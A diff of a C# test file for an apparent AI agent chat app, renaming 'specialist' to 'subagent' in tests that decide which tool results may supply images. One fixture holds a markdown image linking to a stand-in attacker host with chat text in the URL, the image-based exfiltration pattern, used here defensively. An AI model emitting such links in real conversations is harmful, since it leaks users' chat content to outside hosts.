@@ -7,7 +7,7 @@ namespace LouisAgent.Web.Tests.Chats;
 /// <summary>
 /// The images a tool gave. A tool_result whose text holds a markdown image gives its block that URL when the result
 /// arrives, before anything can cut the text; a sub-session's result does the same on its own turn; a plain link is no
-/// image, a failed result gives none, and neither does the result of a delegation call (that text is the specialist's
+/// image, a failed result gives none, and neither does the result of a delegation call (that text is the subagent's
 /// own answer, written by a model, not something a tool read).
 /// </summary>
 public class TurnStreamImageTests
@@ -57,9 +57,9 @@ public class TurnStreamImageTests
     public void AFailedResult_GivesNone() =>
         Assert.That(Apply(ToolUse("c1", "FetchUrl"), ToolResult("c1", Page, failed: true)).Blocks[0].Images, Is.Empty);
 
-    /// <summary>A delegation call's result gives none, since it's the specialist's answer.</summary>
+    /// <summary>A delegation call's result gives none, since it's the subagent's answer.</summary>
     [Test]
-    public void TheResultOfADelegationCall_GivesNone_BecauseItIsTheSpecialistsAnswerNotWhatAToolRead() =>
+    public void TheResultOfADelegationCall_GivesNone_BecauseItIsTheSubagentsAnswerNotWhatAToolRead() =>
         Assert.That(
             Apply(ToolUse("d1", "AskAgent"), ToolResult("d1", "![Bobotie](https://evil.example/?q=the+chat)"))
                 .Blocks[0].Images, Is.Empty);
